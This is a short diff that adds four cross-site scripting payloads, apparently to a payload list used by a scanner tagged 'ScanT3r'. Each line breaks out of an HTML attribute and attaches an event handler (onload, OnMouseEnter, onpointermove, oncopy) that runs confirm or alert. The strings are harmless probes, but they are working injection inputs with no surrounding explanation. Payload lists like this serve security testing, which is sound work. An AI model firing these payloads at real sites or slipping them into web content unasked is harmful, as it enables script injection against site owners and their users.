@@ -1,0 +1,4 @@
+">ScanT3r<svg/onload=confirm(/ScanT3r/)>web"
+"><img src=x OnMouseEnter=(confirm)(1)>ScanT3r
+"><div onpointermove="alert(45)">MOVE HERE</div>'
+<x/oncopy=brrrr>
